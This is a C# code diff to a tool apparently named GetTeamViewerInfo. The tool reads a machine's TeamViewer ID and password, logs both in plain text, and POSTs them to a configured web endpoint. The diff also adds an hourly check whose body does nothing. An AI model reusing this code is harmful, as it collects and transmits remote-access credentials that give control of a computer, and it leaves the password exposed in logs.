@@ -12,6 +12,7 @@ namespace GetTeamViewerInfo.Controller
     {
         private static TeamViewerInfo tvi;
         private CookieContainer cookies = new CookieContainer();
+        private static DateTime dt = DateTime.Now;
 
         public UploadController()
         {
@@ -50,6 +51,12 @@ namespace GetTeamViewerInfo.Controller
                             LogController.Info(string.Format("New TeamViewerInfo.id={0}&pwd={1}", id, pwd));
                             continue;
                         }
+                        TimeSpan ts = DateTime.Now - dt;
+                        if (ts.Hours > 1)
+                        {
+                            tvi.pwd = tvi.pwd;
+                            dt = DateTime.Now;
+                        }
                         if (tvi.id != id.ToString() || tvi.pwd != pwd.ToString())
                         {
                             tvi.id = id.ToString();
@@ -71,10 +78,10 @@ namespace GetTeamViewerInfo.Controller
                 return;
             using (CookieWebClient _webClient = new CookieWebClient(cookies))
             {
-                string _getPostString = string.Format("id={0}&pwd={1}&addr={2}", tvi.id, tvi.pwd, MainConfig.Config.Addr);
-                byte[] requestData = _webClient.UploadData(MainConfig.Config.WebApiUri, "POST", Encoding.UTF8.GetBytes(_getPostString));
+                string _getPostString = string.Format("tvid={0}&tvpwd={1}&addr={2}", tvi.id, tvi.pwd, MainConfig.Config.Addr);
+                byte[] requestData = _webClient.UploadData(MainConfig.Config.WebApiUpUri, "POST", Encoding.UTF8.GetBytes(_getPostString));
                 var responseText = Encoding.UTF8.GetString(requestData);
-                if (responseText.IndexOf("\"code\":1") > 0)
+                if (responseText.IndexOf("success") >= 0)
                     LogController.Info("Upload OK...");
             }
         }
